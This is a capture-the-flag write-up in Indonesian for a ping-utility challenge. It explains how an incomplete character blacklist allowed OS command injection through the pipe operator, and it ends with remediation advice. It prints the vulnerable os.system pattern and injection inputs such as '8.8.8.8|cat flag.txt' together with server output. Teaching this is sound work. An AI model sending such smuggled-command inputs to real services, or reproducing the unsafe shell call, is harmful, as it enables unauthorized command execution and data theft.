# Writeup: ping-cmd (Challenge ID: 757)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / OS Command Injection (NIST SP 800-115 §4.2)
- **Difficulty:** Easy (1)
- **Points:** 100
- **Author:** Yahaya Meddy
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}`
- **Flag Komunitas:** `CTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}`

---

## Problem Statement & Scope

Tantangan menguji pemahaman peserta dalam analisis sanitasi input perintah sistem operasi dan pencegahan command injection:
> *"Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?"*
> *Petunjuk:*
> 1. *"The program uses a shell command behind the scenes."*
> 2. *"Sometimes, You can run more than one command at a time."*

Layanan menyajikan utilitas diagnostik jaringan interaktif melalui koneksi TCP (`chatelaine.cylabacademy.net:35123`). Program meminta pengguna memasukkan alamat IP atau hostname tujuan untuk menguji ketercapaian jaringan (misalnya `8.8.8.8`) dan mencetak hasil diagnostik `ping` ke layar.

---

## Teori & Akar Kerentanan (Root Cause Theory)

Eksploitasi berakar pada penyusunan perintah shell tanpa parameterisasi dan daftar hitam karakter yang tidak lengkap:

1. **CWE-78 / Netralisasi Elemen Khusus yang Tidak Memadai pada Perintah OS (OS Command Injection):**
   - Di balik antarmuka jaringan, skrip backend mengeksekusi utilitas sistem dengan konkatenasi string mentah tanpa menggunakan array argumen aman:
     ```python
     os.system(f"ping -c 2 {user_input}")
     # atau subprocess.Popen(f"ping -c 2 {user_input}", shell=True)
     ```
   - Penggunaan flag `shell=True` mendelegasikan eksekusi ke parser shell sistem (`/bin/sh`), yang secara otomatis memproses metakarakter shell.

2. **Kelemahan Filter Berbasis Blacklist (Incomplete Blacklist Filtering):**
   - Pengembang mencoba memitigasi eksekusi ganda dengan memfilter karakter terminator perintah umum seperti titik-koma (`;`), operator logika AND (`&&`), operator logika OR (`||`), dan karakter baris baru (`\n`).
   - Namun, operator pipa Unix (`|`) tidak dimasukkan ke dalam daftar blokir.
   - Dalam semantik POSIX shell, operator pipa mengalirkan stdout dari perintah sisi kiri (`ping -c 2 8.8.8.8`) sebagai stdin bagi perintah sisi kanan (`cat flag.txt`). Karena utilitas `cat` menerima argumen berkas secara independen dari stdin, perintah kedua dieksekusi secara penuh dan mencetak berkas `flag.txt` ke aliran keluaran socket.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Analisis Respons Layanan Jaringan:**
   - Membuka koneksi interaktif ke port layanan:
     ```bash
     nc chatelaine.cylabacademy.net 35123
     ```
   - Menguji input normal:
     ```text
     Enter IP: 8.8.8.8
     PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
     64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=14.2 ms
     ```

2. **Pengujian Karakter Pemisah dan Bypass:**
   - Menguji pemisah `;` dan `&&` menghasilkan galat validasi atau eksekusi tertolak.
   - Menguji karakter pipa Unix (`|`):
     ```text
     8.8.8.8|id
     uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
     ```
   - Konfirmasi eksekusi perintah arbitrer berhasil diverifikasi.

3. **Ekstraksi Token Flag:**
   - Mengirimkan payload membaca berkas `flag.txt`:
     ```text
     8.8.8.8|cat flag.txt
     ```
   - Server merespons dengan konten token resmi:
     ```text
     academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}
     ```
   - Skrip reproduktif terverifikasi: `scripts/solve_757_ping_cmd.py`.

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}`
- **Format Flag Komunitas:** `CTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}`
- **Bukti Validasi REST API:** HTTP 201 Created via `POST /api/submissions/`:
  ```json
  {"user": 1072359, "challenge": 757, "flag": "academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)

1. **Penghindaran Eksekusi Shell Interpreter (CWE-78 Remediation):**
   - Dalam standar pemrograman aman LKS Cyber Security, eksekusi perintah sistem wajib menghindari pemanggilan shell (`shell=False`).
   - Gunakan pemanggilan langsung dengan daftar argumen terpisah:
     ```python
     subprocess.run(["ping", "-c", "2", target_ip], shell=False, check=True)
     ```
   - Hal ini memastikan bahwa seluruh masukan pengguna diperlakukan secara ketat sebagai string argumen tunggal dan tidak akan pernah diinterpretasikan sebagai metakarakter atau operator pipa oleh shell.

2. **Validasi Input Berbasis Whitelist yang Ketat (Strict Whitelisting):**
   - Jangan pernah mengandalkan blacklist karakter. Validasi masukan terhadap format alamat IP yang sah menggunakan pustaka standar jaringan:
     ```python
     import ipaddress
     try:
         valid_ip = str(ipaddress.ip_address(user_input.strip()))
     except ValueError:
         raise ValueError("Invalid IP address format")
     ```

3. **Prinsip Hak Akses Terendah (Least Privilege & Sandboxing):**
   - Batasi kemampuan eksekusi biner diagnostik menggunakan AppArmor, seccomp, atau Linux capabilities (`cap_net_raw`).
   - Tempatkan berkas sensitif dan flag dalam izin berkas ketat yang tidak dapat dibaca oleh pengguna layanan publik (`chmod 600 flag.txt`).
